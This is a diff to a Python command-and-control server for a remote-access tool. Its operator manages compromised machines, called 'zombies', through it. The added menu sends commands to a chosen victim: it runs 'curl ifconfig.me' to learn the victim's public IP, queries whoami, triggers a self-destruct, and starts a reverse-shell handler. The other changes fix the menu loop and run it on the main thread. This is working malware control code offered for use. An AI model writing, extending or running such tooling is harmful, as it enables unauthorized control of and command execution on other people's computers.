@@ -50,17 +50,17 @@ def server_selection():
     commands = "True"
 
     while not "exit" in commands:
-        commands=input(Fore.GREEN + "Input:" + Fore.WHITE)
+        command=input(Fore.GREEN + "Input:" + Fore.WHITE)
         if command=="":
-            pass
-        if command=="zombies": # Interact with an agent
+            continue
+        elif command=="zombies": # Interact with an agent
             zombies()
-        if command == "cls" or command == "clear": # Clears the terminal
+        elif command == "cls" or command == "clear": # Clears the terminal
             if os.name == 'nt':
                 os.system('cls')
             else:
                 os.system('clear')
-        if command == "?" or command == "help": # Help Menu
+        elif command == "?" or command == "help": # Help Menu
             print(Fore.RED + "commands:\n$ zombies\n$ clear/cls (clears screen)\n$ control + C kills server\n" + Fore.WHITE)
 
 def startrevshells():
@@ -146,11 +146,93 @@ def zombies():
     try:
         selection = int(input( ' Enter the client: '))
     except:
-        print(Fore.RED + "[-] Invalid selection" + Fore.WHITE)
+        print(Fore.RED + "[!] Enter client Number" + Fore.WHITE)
         time.sleep(4)
         return
+
+    while True:
+        if os.name == 'nt':
+            os.system("cls")
+        else:
+            os.system("clear")
+
+        print(Fore.GREEN)
+        print("what would you like to do?")
+        print("1. Send a Message")
+        print("2. Get user info")
+        print("3. Get public ip")
+        print("4. Kill Zombie")
+        print("5. Start a Shell!")
+        print("6. Whoami")
+
+        choice = input(Fore.YELLOW + "[Select a number]: $ " + Fore.WHITE)
+            
+        try:
+            choice=input(Fore.YELLOW + "[Select a number]: $ " + Fore.WHITE)
+        except:    
+            print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
+            time.sleep(2)
+            return            
+        if choice == "1":
+            try:
+                clientlist[selection][1].send(b":msg:\nhey from the server!\n")
+                print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
+                time.sleep(2)
+            except:
+                print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
+                time.sleep(2)
+        if choice == "2":
+            for a in clientdata[selection]:
+                print(a)
+            input()
+        if choice == "3":
+            try:
+                clientlist[selection][1].send(b"c0mm@nd\ncurl ifconfig.me\n")
+                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
+                pubip=clientlist[selection][1].recv(1024)
+                pubip = pubip.decode('UTF-8')
+                print(pubip)
+                input("press any key...")
+            except:
+                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
+                time.sleep(2)
+        if choice == "4":
+            try:
+                clientlist[selection][1].send(b"self-destruct\n")
+                print(Fore.GREEN + "[+] zombie self-destruct succeeded!" + Fore.WHITE)
+                time.sleep(2)
+            except:
+                print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
+                time.sleep(2)
+        if choice == "5":
+            #starttheshell(clientlist[selection][1])
+            #subprocess.call(["python", "testsocketserver.py"])
+            exit_event.clear()
+            
+            handler_thread = threading.Thread(target=startrevshellsvr)
+            handler_thread.daemon = True
+            handler_thread.start()
+            
+            print("[+] starting shell in 2 seconds!")
+            time.sleep(2)
+            
+            clientlist[selection][1].send(b":shell:\n")
+            
+            #handler_thread2 = threading.Thread(target=startrevshellcli)
+            #handler_thread2.daemon = True
+            #handler_thread2.start()
+            while not exit_event.is_set():
+                time.sleep(1)
+            return
+        if choice == "6":
+            clientlist[selection][1].send(b":whoami:\n")
+            whoami=clientlist[selection][1].recv(1024)
+            whoami = whoami.decode('UTF-8')
+            print("You are: ", whoami)
+            time.sleep(2)
+
     
-    
+
 # This block of code starts the threads to keep the main programme alive 
 
 # threading.Thread(...) Creates a new thread
@@ -159,10 +241,10 @@ def zombies():
 # start() Actually begins the thread 
 
 # The line below also calls a variable (handler_thread) which is equal too threading.Thread(...) so that the thread can be referenced
-handler_thread = threading.Thread(target=init_main_sock) # creates and starts threat to run the init_main_sock function
+handler_thread = threading.Thread(target=init_main_sock) # creates and starts thread to run the init_main_sock function
 handler_thread.daemon = True
 handler_thread.start()
 
-while True:
-    time.sleep(1)
+# Run the interactive menu on the main thread so it can read keyboard input
+server_selection()
 
